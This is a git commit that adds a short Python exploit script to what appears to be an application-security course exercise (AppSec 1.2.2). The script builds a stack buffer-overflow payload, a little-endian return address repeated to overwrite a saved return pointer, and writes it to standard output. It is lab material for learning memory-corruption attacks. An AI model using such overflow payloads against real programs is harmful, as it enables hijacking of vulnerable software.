3d6c75a3334a6edded9af78124d175d06d72ef3f
aa <aa@aa.com>
2021-02-02 17:18:37 +0800

    Add 1.2.2

--- AppSec/1.2.2.py
+++ AppSec/1.2.2.py
@@ -5,3 +5,13 @@ from shellcode import shellcode
 from struct import pack
 
 # Your code here
+addr_good = 0x080488c5
+
+pad = 4*4 # pad 16 byte
+
+# payload = b'\x08\x04\x88\xc5'
+payload = b'\xc5\x88\x04\x08'
+
+
+sys.stdout.buffer.write(payload*pad)
+sys.stdout.buffer.write(payload)
